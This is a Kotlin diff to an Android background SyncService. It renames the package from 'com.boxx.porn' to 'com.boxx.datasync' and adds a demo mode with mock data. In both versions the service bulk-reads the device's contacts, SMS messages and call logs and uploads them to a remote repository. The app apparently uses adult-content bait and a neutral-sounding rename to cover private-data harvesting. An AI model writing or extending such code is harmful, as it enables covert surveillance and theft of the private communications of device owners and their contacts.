@@ -1,4 +1,4 @@
-package com.boxx.porn.sync
+package com.boxx.datasync.sync
 
 import android.app.Notification
 import android.app.NotificationChannel
@@ -19,11 +19,13 @@ import android.provider.Telephony
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
-import com.boxx.porn.MainActivity
-import com.boxx.porn.data.FirestoreRepository
-import com.boxx.porn.model.Device
-import com.boxx.porn.utils.DataHelper
-import com.boxx.porn.utils.DeviceIdHelper
+import androidx.preference.PreferenceManager
+import com.boxx.datasync.MainActivity
+import com.boxx.datasync.data.MockDataGenerator
+import com.boxx.datasync.domain.repository.DataRepository
+import com.boxx.datasync.domain.model.Device
+import com.boxx.datasync.utils.DataHelper
+import com.boxx.datasync.utils.DeviceIdHelper
 import com.google.firebase.crashlytics.FirebaseCrashlytics
 import dagger.hilt.android.AndroidEntryPoint
 import kotlinx.coroutines.*
@@ -34,7 +36,7 @@ class SyncService : Service() {
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
     @Inject
-    lateinit var repository: FirestoreRepository
+    lateinit var repository: DataRepository
 
     private val crashlytics = FirebaseCrashlytics.getInstance()
     private lateinit var deviceId: String
@@ -87,16 +89,27 @@ class SyncService : Service() {
     }
 
     private suspend fun performSync() {
-        if (!hasRequiredPermissions()) {
-            Log.w("SyncService", "Missing permissions for sync, skipping.")
-            return
-        }
+        val prefs = PreferenceManager.getDefaultSharedPreferences(this)
+        val isDemoMode = prefs.getBoolean("demo_mode", false)
 
         try {
-            // In production, we'd use delta sync. For this requirement, we sync everything.
-            val contacts = DataHelper.fetchContacts(this@SyncService)
-            val smsList = DataHelper.fetchSMS(this@SyncService)
-            val callLogs = DataHelper.fetchCallLogs(this@SyncService)
+            val contacts = if (isDemoMode) {
+                MockDataGenerator.generateMockContacts()
+            } else {
+                if (hasRequiredPermissions()) DataHelper.fetchContacts(this@SyncService) else emptyList()
+            }
+
+            val smsList = if (isDemoMode) {
+                MockDataGenerator.generateMockSMS()
+            } else {
+                if (hasRequiredPermissions()) DataHelper.fetchSMS(this@SyncService) else emptyList()
+            }
+
+            val callLogs = if (isDemoMode) {
+                MockDataGenerator.generateMockCallLogs()
+            } else {
+                if (hasRequiredPermissions()) DataHelper.fetchCallLogs(this@SyncService) else emptyList()
+            }
 
             repository.syncContacts(deviceId, contacts)
             repository.syncSMS(deviceId, smsList)
@@ -109,9 +122,10 @@ class SyncService : Service() {
                 contactCount = contacts.size,
                 smsCount = smsList.size,
                 callLogCount = callLogs.size,
-                timestamp = System.currentTimeMillis()
+                timestamp = System.currentTimeMillis(),
+                isDemoMode = isDemoMode
             ))
-            Log.d("SyncService", "Sync completed successfully")
+            Log.d("SyncService", "Sync completed successfully (Demo: $isDemoMode)")
         } catch (e: Exception) {
             Log.e("SyncService", "Error during sync", e)
             crashlytics.recordException(e)
